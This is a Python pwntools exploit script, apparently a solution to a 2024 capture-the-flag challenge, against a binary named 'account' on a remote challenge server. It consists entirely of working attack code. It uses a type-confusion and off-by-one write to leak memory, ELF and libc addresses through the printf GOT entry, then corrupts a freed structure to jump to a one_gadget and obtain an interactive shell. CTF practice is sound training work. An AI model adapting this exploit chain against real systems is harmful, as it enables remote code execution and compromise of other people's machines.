#!/usr/bin/python3
from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('account')
libc = ELF('libc.so.6')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')

def wait():
    p.wait(0.5)
def add_account(type, data):
    payload = b'\x00'
    payload += p8(type)
    payload += data
    p.send(payload)
    wait()
def delete_account(id):
    p.send(b'\x01' + p8(id))
    wait()
def edit_account(type, id, data):
    p.send(b'\x02' + p8(id) + p8(type) + data)
    wait()
def add_group():
    p.send(b'\x10')
    wait()
def delete_group(id):
    p.send(b'\x11' + p8(id))
    wait()
def add_account_to_group(accountId, groupId):
    p.send(b'\x12' + p8(groupId) + p8(accountId))
    wait()
def remove_account_from_group(accountId, groupId):
    p.send(b'\x13' + p8(groupId) + p8(accountId))
    wait()
def print_group(id):
    p.send(b'\x14' + p8(id))
    wait()


def GDB(proc):
    gdb.attach(p, gdbscript='''
               
               #b *($r13 + 0xe52)
               #b *($r13 - 0x1260 + 0x2900)
               b system
               c
               ''')

#p = process()
#GDB(p)
p = remote('hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com', 5002)

add_account(1, b'A'*194)

add_account(1, b'A'*0x4)
add_account(1, b'A')

#setup some uninit field to not null
delete_account(2)
add_account(1, b'A'*23)
delete_account(2)
add_account(1, b'A')

add_account(1, b'A')
add_group()
add_account_to_group(3, 0)
edit_account(0, 1, b'AAAA') # overwrite account.type
edit_account(1, 2, b'AA\x01\x02' + b'A'*6) # off by one account.data
p.recv(0x100)
print_group(0)
leak = p.recv(6)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
mmap = leak - 0x110
print('mmap: ', hex(mmap))

edit_account(0, 1, b'AAAA') # overwrite account.type
edit_account(1, 2, b'AA\x01\x02' + b'A'*6 + p64(mmap + 0x13c)) # overwrite account.data
p.recv(0x100)
p.recv(0x100)
print_group(0)
leak = p.recv(6)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
elf.address = leak - 0x6010
print('elf: ', hex(elf.address))

edit_account(0, 1, b'AAAA') # overwrite account.type
edit_account(1, 2, b'AA\x01\x02' + b'A'*6 + p64(elf.got['printf'])) # overwrite account.data
p.recv(0x100)
p.recv(0x100)
print_group(0)
leak = p.recv(6)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
libc.address = leak - libc.symbols['printf']
print('libc: ', hex(libc.address))

edit_account(0, 1, b'AAAA') # overwrite account.type
edit_account(1, 2, b'AA\x01\x02' + b'A'*6 + p64(mmap + 0x12c)) # overwrite account.data
remove_account_from_group(3, 0)
delete_account(3) # free group
ONE_GADGET = libc.address + 0xebc81
add_account(0, b'A'*16 + p64(mmap + 0x1dc - 8))
add_account(0, p64(ONE_GADGET))
delete_group(0)

p.interactive()